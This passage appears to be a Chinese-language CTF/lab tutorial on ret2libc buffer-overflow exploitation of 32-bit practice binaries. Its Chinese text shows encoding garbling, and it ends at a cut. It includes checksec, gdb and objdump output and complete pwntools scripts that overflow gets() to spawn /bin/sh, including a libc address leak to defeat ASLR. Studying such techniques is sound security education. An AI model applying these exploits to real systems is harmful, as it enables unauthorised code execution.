<h2 id="1-ç¨‹åºä¸­æœ‰systemå’Œâ€™-bin-shâ€™"><a href="#1-ç¨‹åºä¸­æœ‰systemå’Œâ€™-bin-shâ€™" class="headerlink" title="1. ç¨‹åºä¸­æœ‰systemå’Œâ€™/bin/shâ€™"></a>1. ç¨‹åºä¸­æœ‰systemå’Œâ€™/bin/shâ€™</h2><h3 id="æ£€æŸ¥ä¿æŠ¤-1"><a href="#æ£€æŸ¥ä¿æŠ¤-1" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤"></a>æ£€æŸ¥ä¿æŠ¤</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ret2libc1</span><br><span class="line">[*] &apos;/home/han/ck/pwn/linux/ret2libc/ret2libc1&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="ç¡®å®šæ¼æ´ä½ç½®"><a href="#ç¡®å®šæ¼æ´ä½ç½®" class="headerlink" title="ç¡®å®šæ¼æ´ä½ç½®"></a>ç¡®å®šæ¼æ´ä½ç½®</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"RET2LIBC &gt;_&lt;"</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="è®¡ç®—åç§»-1"><a href="#è®¡ç®—åç§»-1" class="headerlink" title="è®¡ç®—åç§»"></a>è®¡ç®—åç§»</h3><h3 id="å¯»æ‰¾è·³æ¿-1"><a href="#å¯»æ‰¾è·³æ¿-1" class="headerlink" title="å¯»æ‰¾è·³æ¿"></a>å¯»æ‰¾è·³æ¿</h3><ol>
<li><p>system_plt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048460 _system         proc near               ; CODE XREF: secure+44p</span><br><span class="line">.plt:08048460                 jmp     ds:off_804A018</span><br><span class="line">.plt:08048460 _system         endp</span><br></pre></td></tr></table></figure>
</li>
<li><p>â€˜binshâ€™</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ret2libc1 --string &apos;/bin/sh&apos;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048744 : /bin/sh</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="pwnæµ‹è¯•-2"><a href="#pwnæµ‹è¯•-2" class="headerlink" title="pwnæµ‹è¯•"></a>pwnæµ‹è¯•</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ret2libc1'</span>)</span><br><span class="line"></span><br><span class="line">offset =<span class="number">112</span></span><br><span class="line">binsh = <span class="number">0x08048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">fake_ret = <span class="string">'bbbb'</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'a'</span>*offset,system_plt,fake_ret,binsh])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>fake_retæ˜¯è°ƒç”¨systemä¹‹åçš„è¿”å›åœ°å€ï¼Œbinshå°±æ˜¯systemçš„å‚æ•°</p>
<h2 id="2-æ²¡æœ‰binsh"><a href="#2-æ²¡æœ‰binsh" class="headerlink" title="2. æ²¡æœ‰binsh"></a>2. æ²¡æœ‰binsh</h2><p>éœ€è¦æˆ‘ä»¬è‡ªå·±æ¥è¯»å–å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸¤ä¸ª gadgetsï¼Œç¬¬ä¸€ä¸ªæ§åˆ¶ç¨‹åºè¯»å–å­—ç¬¦ä¸²ï¼Œä½¿ç”¨getså°†â€™/bin/shâ€™å†™å…¥ç¨‹åºæŸä¸ªä½ç½®ï¼Œç¬¬äºŒä¸ªæ§åˆ¶ç¨‹åºæ‰§è¡Œ system(â€œ/bin/shâ€)ã€‚</p>
<p>æˆ‘ä»¬åœ¨.bssæ®µå‘ç°äº†æœªåˆ©ç”¨çš„buf2ï¼Œå¯ä»¥æŠŠbinshå†™å…¥buf2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)</span><br><span class="line">.bss:0804A080 _bss            ends</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./ret2libc2&apos;)</span><br><span class="line"></span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">pop_ebx = 0x0804843d</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">buf2_add = 0x804a080</span><br><span class="line"></span><br><span class="line">payload = flat([&apos;a&apos;*112,gets_plt,pop_ebx,buf2_add,system_plt,0xdeadbeef,buf2_add])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>buf2_addæ˜¯getsçš„å‚æ•°ï¼Œpop_ebxå°†getsè¿”å›åçš„å †æ ˆå¹³è¡¡ï¼Œç§»äº¤æ§åˆ¶æƒç»™system</p>
<h2 id="3-ä¸¤ä¸ªéƒ½æ²¡æœ‰-amp-æ— ASLR"><a href="#3-ä¸¤ä¸ªéƒ½æ²¡æœ‰-amp-æ— ASLR" class="headerlink" title="3. ä¸¤ä¸ªéƒ½æ²¡æœ‰&amp;æ— ASLR"></a>3. ä¸¤ä¸ªéƒ½æ²¡æœ‰&amp;æ— ASLR</h2><p>ç¨‹åºä¸­ä¸¤ä¸ªéƒ½æ²¡æœ‰ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨libcä¸­çš„systemå’Œâ€™/bin/shâ€™<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ret2libc3</span><br><span class="line">[*] &apos;/home/han/ck/pwn/linux/ret2libc/ret2libc3&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p>
<h3 id="å¯»æ‰¾è·³æ¿-2"><a href="#å¯»æ‰¾è·³æ¿-2" class="headerlink" title="å¯»æ‰¾è·³æ¿"></a>å¯»æ‰¾è·³æ¿</h3><p>è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•ã€‚ç„¶åé€šè¿‡printå’Œfindå‘½ä»¤æ¥æŸ¥æ‰¾systemå’Œâ€/bin/shâ€å­—ç¬¦ä¸²çš„åœ°å€ã€‚<br>æˆ‘ä»¬é¦–å…ˆåœ¨mainå‡½æ•°ä¸Šä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œç„¶åæ‰§è¡Œç¨‹åºï¼Œè¿™æ ·çš„è¯ç¨‹åºä¼šåŠ è½½libc.soåˆ°å†…å­˜ä¸­ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡â€print systemâ€è¿™ä¸ªå‘½ä»¤æ¥è·å–systemå‡½æ•°åœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œéšåæˆ‘ä»¬å¯ä»¥é€šè¿‡â€ print __libc_start_mainâ€è¿™ä¸ªå‘½ä»¤æ¥è·å–libc.soåœ¨å†…å­˜ä¸­çš„èµ·å§‹ä½ç½®ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥é€šè¿‡findå‘½ä»¤æ¥æŸ¥æ‰¾â€/bin/shâ€è¿™ä¸ªå­—ç¬¦ä¸²ã€‚è¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†systemçš„åœ°å€0xf7e19d10ä»¥åŠâ€/bin/shâ€çš„åœ°å€0xf7f588cfã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, main () at ret2libcGOT.c:20</span><br><span class="line">20	ret2libcGOT.c: No such file or directory.</span><br><span class="line">gdb-peda$ print system</span><br><span class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e19d10 &lt;system&gt;</span><br><span class="line">gdb-peda$ print __libc_start_main</span><br><span class="line">$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7df5d90 &lt;__libc_start_main&gt;</span><br><span class="line">gdb-peda$ find 0xf7df5d90,+2200000,&quot;/bin/sh&quot;</span><br><span class="line">Searching for &apos;0xf7df5d90,+2200000,/bin/sh&apos; in: None ranges</span><br><span class="line">Search for a pattern in memory; support regex search</span><br><span class="line">Usage:</span><br><span class="line">    searchmem pattern start end</span><br><span class="line">    searchmem pattern mapname</span><br><span class="line"></span><br><span class="line">gdb-peda$ find &quot;/bin/sh&quot;</span><br><span class="line">Searching for &apos;/bin/sh&apos; in: None ranges</span><br><span class="line">Found 1 results, display max 1 items:</span><br><span class="line">libc : 0xf7f588cf (&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure></p>
<h3 id="æµ‹è¯•-2"><a href="#æµ‹è¯•-2" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./ret2libc3&apos;)</span><br><span class="line"></span><br><span class="line">offset = 112</span><br><span class="line">system_addr = 0xf7e19d10</span><br><span class="line">binsh = 0xf7f588cf</span><br><span class="line"></span><br><span class="line">payload = flat([&apos;a&apos;*112,system_addr,0xdeabeef,binsh])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="4-ä¸¤ä¸ªéƒ½æ²¡æœ‰-amp-æœ‰ASLR"><a href="#4-ä¸¤ä¸ªéƒ½æ²¡æœ‰-amp-æœ‰ASLR" class="headerlink" title="4. ä¸¤ä¸ªéƒ½æ²¡æœ‰&amp;æœ‰ASLR"></a>4. ä¸¤ä¸ªéƒ½æ²¡æœ‰&amp;æœ‰ASLR</h2><p>é€šè¿‡<code>sudo cat /proc/[pid]/maps</code>æˆ–è€…<code>ldd</code>æŸ¥çœ‹ï¼Œä½ ä¼šå‘ç°libc.soåœ°å€æ¯æ¬¡éƒ½æ˜¯å˜åŒ–çš„<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ldd ret2libc3</span><br><span class="line">	linux-gate.so.1 (0xf7f43000)</span><br><span class="line">	libc.so.6 =&gt; /lib32/libc.so.6 (0xf7d4c000)</span><br><span class="line">	/lib/ld-linux.so.2 (0xf7f45000)</span><br><span class="line"></span><br><span class="line">han at ubuntu in ~/ck/pwn/linux/ret2libc</span><br><span class="line">$ ldd ret2libc3</span><br><span class="line">	linux-gate.so.1 (0xf7f96000)</span><br><span class="line">	libc.so.6 =&gt; /lib32/libc.so.6 (0xf7d9f000)</span><br><span class="line">	/lib/ld-linux.so.2 (0xf7f98000)</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆå¦‚ä½•è§£å†³åœ°å€éšæœºåŒ–çš„é—®é¢˜å‘¢ï¼Ÿæ€è·¯æ˜¯ï¼šæˆ‘ä»¬éœ€è¦å…ˆæ³„æ¼å‡ºlibc.soæŸäº›å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œç„¶åå†åˆ©ç”¨æ³„æ¼å‡ºçš„å‡½æ•°åœ°å€æ ¹æ®åç§»é‡è®¡ç®—å‡ºsystem()å‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œç„¶åå†æ‰§è¡Œæˆ‘ä»¬çš„ret2libcçš„shellcodeã€‚æ—¢ç„¶æ ˆï¼Œlibcï¼Œheapçš„åœ°å€éƒ½æ˜¯éšæœºçš„ã€‚æˆ‘ä»¬æ€ä¹ˆæ‰èƒ½æ³„éœ²å‡ºlibc.soçš„åœ°å€å‘¢ï¼Ÿæ–¹æ³•è¿˜æ˜¯æœ‰çš„ï¼Œå› ä¸ºç¨‹åºæœ¬èº«åœ¨å†…å­˜ä¸­çš„åœ°å€å¹¶ä¸æ˜¯éšæœºçš„ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1563267241/pwn/4a7227aa9f00bd2fd45d363da4cf25c6fd425638.jpg" alt><br>ä¹Ÿå°±æ˜¯è¯´ç¨‹åºå†…å­˜æ˜ åƒæ˜¯æ²¡æœ‰éšæœºçš„</p>
<p>é¦–å…ˆæˆ‘ä»¬åˆ©ç”¨<code>objdump</code>æ¥æŸ¥çœ‹å¯ä»¥åˆ©ç”¨çš„pltå‡½æ•°å’Œå‡½æ•°å¯¹åº”çš„gotè¡¨ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">$ objdump  -d -j  .plt ./ret2libc3</span><br><span class="line"></span><br><span class="line">./ret2libc3:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">08048420 &lt;.plt&gt;:</span><br><span class="line"> 8048420:	ff 35 04 a0 04 08    	pushl  0x804a004</span><br><span class="line"> 8048426:	ff 25 08 a0 04 08    	jmp    *0x804a008</span><br><span class="line"> 804842c:	00 00                	add    %al,(%eax)</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">08048430 &lt;printf@plt&gt;:</span><br><span class="line"> 8048430:	ff 25 0c a0 04 08    	jmp    *0x804a00c</span><br><span class="line"> 8048436:	68 00 00 00 00       	push   $0x0</span><br><span class="line"> 804843b:	e9 e0 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048440 &lt;gets@plt&gt;:</span><br><span class="line"> 8048440:	ff 25 10 a0 04 08    	jmp    *0x804a010</span><br><span class="line"> 8048446:	68 08 00 00 00       	push   $0x8</span><br><span class="line"> 804844b:	e9 d0 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048450 &lt;time@plt&gt;:</span><br><span class="line"> 8048450:	ff 25 14 a0 04 08    	jmp    *0x804a014</span><br><span class="line"> 8048456:	68 10 00 00 00       	push   $0x10</span><br><span class="line"> 804845b:	e9 c0 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048460 &lt;puts@plt&gt;:</span><br><span class="line"> 8048460:	ff 25 18 a0 04 08    	jmp    *0x804a018</span><br><span class="line"> 8048466:	68 18 00 00 00       	push   $0x18</span><br><span class="line"> 804846b:	e9 b0 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048470 &lt;__gmon_start__@plt&gt;:</span><br><span class="line"> 8048470:	ff 25 1c a0 04 08    	jmp    *0x804a01c</span><br><span class="line"> 8048476:	68 20 00 00 00       	push   $0x20</span><br><span class="line"> 804847b:	e9 a0 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048480 &lt;srand@plt&gt;:</span><br><span class="line"> 8048480:	ff 25 20 a0 04 08    	jmp    *0x804a020</span><br><span class="line"> 8048486:	68 28 00 00 00       	push   $0x28</span><br><span class="line"> 804848b:	e9 90 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048490 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 8048490:	ff 25 24 a0 04 08    	jmp    *0x804a024</span><br><span class="line"> 8048496:	68 30 00 00 00       	push   $0x30</span><br><span class="line"> 804849b:	e9 80 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080484a0 &lt;setvbuf@plt&gt;:</span><br><span class="line"> 80484a0:	ff 25 28 a0 04 08    	jmp    *0x804a028</span><br><span class="line"> 80484a6:	68 38 00 00 00       	push   $0x38</span><br><span class="line"> 80484ab:	e9 70 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080484b0 &lt;rand@plt&gt;:</span><br><span class="line"> 80484b0:	ff 25 2c a0 04 08    	jmp    *0x804a02c</span><br><span class="line"> 80484b6:	68 40 00 00 00       	push   $0x40</span><br><span class="line"> 80484bb:	e9 60 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080484c0 &lt;__isoc99_scanf@plt&gt;:</span><br><span class="line"> 80484c0:	ff 25 30 a0 04 08    	jmp    *0x804a030</span><br><span class="line"> 80484c6:	68 48 00 00 00       	push   $0x48</span><br><span class="line"> 80484cb:	e9 50 ff ff ff       	jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ objdump  -R ret2libc3</span><br><span class="line"></span><br><span class="line">ret2libc3:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE</span><br><span class="line">08049ffc R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a040 R_386_COPY        stdin@@GLIBC_2.0</span><br><span class="line">0804a060 R_386_COPY        stdout@@GLIBC_2.0</span><br><span class="line">0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   gets@GLIBC_2.0</span><br><span class="line">0804a014 R_386_JUMP_SLOT   time@GLIBC_2.0</span><br><span class="line">0804a018 R_386_JUMP_SLOT   puts@GLIBC_2.0</span><br><span class="line">0804a01c R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">0804a020 R_386_JUMP_SLOT   srand@GLIBC_2.0</span><br><span class="line">0804a024 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a028 R_386_JUMP_SLOT   setvbuf@GLIBC_2.0</span><br><span class="line">0804a02c R_386_JUMP_SLOT   rand@GLIBC_2.0</span><br><span class="line">0804a030 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure></p>
<p>æ€è·¯ï¼šé€šè¿‡puts@pltæ‰“å°å‡º<strong>libc_start_mainåœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯</strong>libc_start_main@gotã€‚<br>æ—¢ç„¶puts()å‡½æ•°å®ç°æ˜¯åœ¨libc.soå½“ä¸­ï¼Œé‚£æˆ‘ä»¬è°ƒç”¨çš„puts@plt()å‡½æ•°ä¸ºä»€ä¹ˆä¹Ÿèƒ½å®ç°puts()åŠŸèƒ½å‘¢? è¿™æ˜¯å› ä¸ºlinuxé‡‡ç”¨äº†<strong>å»¶æ—¶ç»‘å®šæŠ€æœ¯</strong>ï¼Œå½“æˆ‘ä»¬è°ƒç”¨puts@plt()çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šå°†çœŸæ­£çš„puts()å‡½æ•°åœ°å€linkåˆ°gotè¡¨çš„puts.gotä¸­ï¼Œç„¶åputs@plt()ä¼šæ ¹æ®puts.got è·³è½¬åˆ°çœŸæ­£çš„puts()å‡½æ•°ä¸Šå»ã€‚<br>ç”±äº libc çš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œæˆ‘ä»¬éœ€è¦æ³„æ¼<strong>å·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°çš„åœ°å€</strong>ã€‚è¿™é‡Œæˆ‘ä»¬æ³„éœ² libc_start_main çš„åœ°å€ï¼Œè¿™æ˜¯å› ä¸ºå®ƒæ˜¯ç¨‹åº<strong>æœ€åˆè¢«æ‰§è¡Œ</strong>çš„åœ°æ–¹ã€‚</p>
<p>ä½¿ç”¨lddå‘½ä»¤å¯ä»¥æŸ¥çœ‹ç›®æ ‡ç¨‹åºè°ƒç”¨çš„soåº“ã€‚éšåæˆ‘ä»¬æŠŠlibc.soæ‹·è´åˆ°å½“å‰ç›®å½•ï¼Œå› ä¸ºæˆ‘ä»¬çš„expéœ€è¦è¿™ä¸ªsoæ–‡ä»¶æ¥è®¡ç®—ç›¸å¯¹åœ°å€ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ldd ret2libc3</span><br><span class="line">	linux-gate.so.1 (0xf7f6b000)</span><br><span class="line">	libc.so.6 =&gt; /lib32/libc.so.6 (0xf7d74000)</span><br><span class="line">	/lib/ld-linux.so.2 (0xf7f6d000)</span><br><span class="line"></span><br><span class="line">han at ubuntu in ~/ck/pwn/linux/ret2libc</span><br><span class="line">$ cp /lib32/libc.so.6  libc.so</span><br></pre></td></tr></table></figure></p>
<h3 id="pwnæµ‹è¯•-3"><a href="#pwnæµ‹è¯•-3" class="headerlink" title="pwnæµ‹è¯•"></a>pwnæµ‹è¯•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">p = process(&apos;./ret2libc3&apos;)</span><br><span class="line">elf = ELF(&apos;./ret2libc3&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so&apos;)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[&apos;puts&apos;]</span><br><span class="line">libc_start_main_got =elf.got[&apos;__libc_start_main&apos;]</span><br><span class="line">main = elf.symbols[&apos;main&apos;]</span><br><span class="line"></span><br><span class="line">print(&quot;leak libc_start_main_got addr and return to main again&quot;)</span><br><span class="line">payload = flat([&apos;a&apos;*112],puts_plt,main,libc_start_main_got)</span><br><span class="line">p.sendlineafter(&apos;Can you find it !?&apos;,payload)</span><br><span class="line"></span><br><span class="line">print(&quot;receiving libc_start_main_got&quot;)</span><br><span class="line">libc_start_main_addr = u32(p.recv(4))</span><br><span class="line">print(&apos;libc_start_main_addr = &apos; + hex(libc_start_main_addr))</span><br><span class="line"></span><br><span class="line">print(&quot;calculating system() addr and \&quot;/bin/sh\&quot; addr&quot;)</span><br><span class="line">system_addr = libc_start_main_addr + (libc.symbols[&apos;system&apos;]-libc.symbols[&apos;__libc_start_main&apos;])</span><br><span class="line">print(&apos;system_addr= &apos; + hex(system_addr))</span><br><span class="line">binsh_addr = libc_start_main_addr + (next(libc.search(&apos;/bin/sh&apos;))-libc.symbols[&apos;__libc_start_main&apos;])</span><br><span class="line">print(&apos;binsh_addr= &apos; + hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">print(&quot;get shell&quot;)</span><br><span class="line"></span><br><span class="line">print(p32(system_addr),p32(binsh_addr))</span><br><span class="line">payload = flat([&apos;a&apos;*104,system_addr,0xdeadbeef,binsh_addr])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<ol>
